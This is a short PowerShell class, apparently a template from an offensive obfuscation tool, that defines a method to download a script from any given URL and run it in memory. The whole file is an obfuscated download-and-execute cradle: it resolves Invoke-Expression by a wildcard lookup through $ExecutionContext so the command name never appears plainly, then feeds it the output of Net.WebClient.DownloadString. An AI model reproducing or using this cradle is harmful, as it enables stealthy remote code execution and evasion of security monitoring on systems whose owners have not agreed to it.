Class ObfDownloadFileContent11 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\5
        Write-Host .$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Member|Where-Object{(GV _).Value.Name-like'*ts'}).Name).Invoke('I*-E*n')(New-Object Net.WebClient).DownloadString($url)
    }

}